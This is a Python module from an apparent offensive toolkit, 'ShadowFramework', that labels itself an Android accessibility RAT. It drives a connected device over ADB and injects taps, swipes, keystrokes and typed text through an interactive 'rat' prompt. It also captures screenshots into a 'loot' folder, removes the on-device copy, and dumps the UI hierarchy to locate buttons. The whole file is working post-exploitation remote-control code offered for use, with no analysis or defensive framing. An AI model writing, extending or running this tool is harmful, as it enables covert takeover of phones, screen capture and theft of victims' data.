"""
ShadowFramework — Android Accessibility RAT
Leverages accessibility service to control device UI via ADB input commands.
"""
import subprocess
import time
from rich.console import Console
from rich.prompt import Prompt
from utils.logger import log_action

console = Console()

def _adb(dev, *args, timeout=10):
    cmd = ['adb', '-s', dev] + list(args)
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return r.stdout.strip(), r.stderr.strip(), r.returncode
    except subprocess.TimeoutExpired:
        return '', 'timeout', 1


class Module:
    MODULE_INFO = {
        'name': 'post/android/accessibility_rat',
        'description': 'Remote access via ADB input injection — control device UI, type text, navigate, take screenshots.',
        'options': {
            'DEVICE_ID': 'Target device serial',
            'ACTION':    'Action: interactive, screenshot, type, swipe, tap, keyevent [default: interactive]',
            'TEXT':      'Text to type (for type action)',
            'COORDS':    'X,Y coordinates (for tap/swipe actions)',
        }
    }

    def __init__(self, framework):
        self.framework = framework

    def _screenshot(self, device_id):
        """Capture and pull screenshot."""
        remote = '/sdcard/shadow_ss.png'
        _adb(device_id, 'shell', 'screencap', '-p', remote)
        
        from pathlib import Path
        loot = Path('loot/screenshots')
        loot.mkdir(parents=True, exist_ok=True)
        ts = int(time.time())
        local = loot / f'screen_{ts}.png'
        _adb(device_id, 'pull', remote, str(local))
        _adb(device_id, 'shell', 'rm', remote)
        console.print(f"[green][+] Screenshot: {local}[/green]")
        return str(local)

    def _get_screen_info(self, device_id):
        """Get screen resolution."""
        out, _, _ = _adb(device_id, 'shell', 'wm', 'size')
        if 'x' in out:
            parts = out.split(':')[-1].strip().split('x')
            return int(parts[0]), int(parts[1])
        return 1080, 1920

    def _dump_ui(self, device_id):
        """Dump current UI hierarchy for element targeting."""
        out, _, _ = _adb(device_id, 'shell', 'uiautomator', 'dump', '/dev/tty')
        return out

    def _interactive(self, device_id):
        """Interactive RAT control loop."""
        width, height = self._get_screen_info(device_id)
        console.print(f"[cyan]  Screen: {width}x{height}[/cyan]")
        console.print(f"[yellow]Commands: tap X Y | swipe X1 Y1 X2 Y2 | type TEXT | key KEYCODE | ss | ui | home | back | recent | q[/yellow]")

        while True:
            try:
                cmd = Prompt.ask("[bold cyan]rat[/bold cyan]")
            except (KeyboardInterrupt, EOFError):
                break

            if not cmd:
                continue
            parts = cmd.strip().split(None, 1)
            action = parts[0].lower()

            if action == 'q' or action == 'quit':
                break
            elif action == 'tap' and len(parts) > 1:
                coords = parts[1].split()
                if len(coords) >= 2:
                    _adb(device_id, 'shell', 'input', 'tap', coords[0], coords[1])
                    console.print(f"  [dim]Tapped ({coords[0]}, {coords[1]})[/dim]")
            elif action == 'swipe' and len(parts) > 1:
                coords = parts[1].split()
                if len(coords) >= 4:
                    _adb(device_id, 'shell', 'input', 'swipe', *coords[:4])
                    console.print(f"  [dim]Swiped[/dim]")
            elif action == 'type' and len(parts) > 1:
                text = parts[1].replace(' ', '%s')
                _adb(device_id, 'shell', 'input', 'text', text)
                console.print(f"  [dim]Typed: {parts[1]}[/dim]")
            elif action == 'key' and len(parts) > 1:
                _adb(device_id, 'shell', 'input', 'keyevent', parts[1])
                console.print(f"  [dim]Key: {parts[1]}[/dim]")
            elif action == 'ss':
                self._screenshot(device_id)
            elif action == 'ui':
                ui = self._dump_ui(device_id)
                # Extract clickable elements
                import re
                buttons = re.findall(r'text="([^"]+)"[^>]*bounds="\[(\d+),(\d+)\]\[(\d+),(\d+)\]"', ui)
                if buttons:
                    for text, x1, y1, x2, y2 in buttons[:15]:
                        cx = (int(x1) + int(x2)) // 2
                        cy = (int(y1) + int(y2)) // 2
                        console.print(f"    [yellow]{text}[/yellow] → tap {cx} {cy}")
                else:
                    console.print(f"  [dim]{ui[:500]}[/dim]")
            elif action == 'home':
                _adb(device_id, 'shell', 'input', 'keyevent', 'KEYCODE_HOME')
            elif action == 'back':
                _adb(device_id, 'shell', 'input', 'keyevent', 'KEYCODE_BACK')
            elif action == 'recent':
                _adb(device_id, 'shell', 'input', 'keyevent', 'KEYCODE_APP_SWITCH')
            else:
                console.print("[dim]Unknown command. Use: tap, swipe, type, key, ss, ui, home, back, recent, q[/dim]")

    def run(self):
        device_id = self.framework.options.get('DEVICE_ID', '')
        action = self.framework.options.get('ACTION', 'interactive').lower()

        if not device_id:
            out, _, _ = _adb('', 'devices')
            for line in out.splitlines()[1:]:
                if '\tdevice' in line:
                    device_id = line.split('\t')[0]
                    break
        if not device_id:
            console.print("[red][!] No device found.[/red]")
            return

        console.print(f"[cyan][*] Accessibility RAT on {device_id}[/cyan]")
        log_action(f"RAT control on {device_id}")

        if action == 'interactive':
            self._interactive(device_id)
        elif action == 'screenshot':
            self._screenshot(device_id)
        elif action == 'type':
            text = self.framework.options.get('TEXT', '')
            if text:
                _adb(device_id, 'shell', 'input', 'text', text.replace(' ', '%s'))
                console.print(f"[green][+] Typed: {text}[/green]")
        elif action == 'tap':
            coords = self.framework.options.get('COORDS', '').split(',')
            if len(coords) >= 2:
                _adb(device_id, 'shell', 'input', 'tap', coords[0], coords[1])
                console.print(f"[green][+] Tapped ({coords[0]}, {coords[1]})[/green]")
        elif action == 'keyevent':
            text = self.framework.options.get('TEXT', 'KEYCODE_HOME')
            _adb(device_id, 'shell', 'input', 'keyevent', text)
        elif action == 'swipe':
            coords = self.framework.options.get('COORDS', '').split(',')
            if len(coords) >= 4:
                _adb(device_id, 'shell', 'input', 'swipe', *coords[:4])

        console.print(f"[bold green][+] RAT action complete.[/bold green]")
